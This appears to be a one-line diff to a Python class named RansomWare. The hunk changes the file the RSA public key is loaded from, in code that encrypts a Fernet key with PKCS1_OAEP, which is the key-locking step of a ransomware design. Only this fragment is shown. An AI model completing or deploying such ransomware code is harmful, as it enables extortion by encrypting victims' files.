@@ -118,7 +118,7 @@ class RansomWare:
             fernet_key = fk.read()
         with open('fernet_key.txt', 'wb') as f:
             # Public RSA key
-            self.public_key = RSA.import_key(open('01.pem').read())
+            self.public_key = RSA.import_key(open('public.pem').read())
             # Public encrypter object
             public_crypter =  PKCS1_OAEP.new(self.public_key)
             # Encrypted fernet key
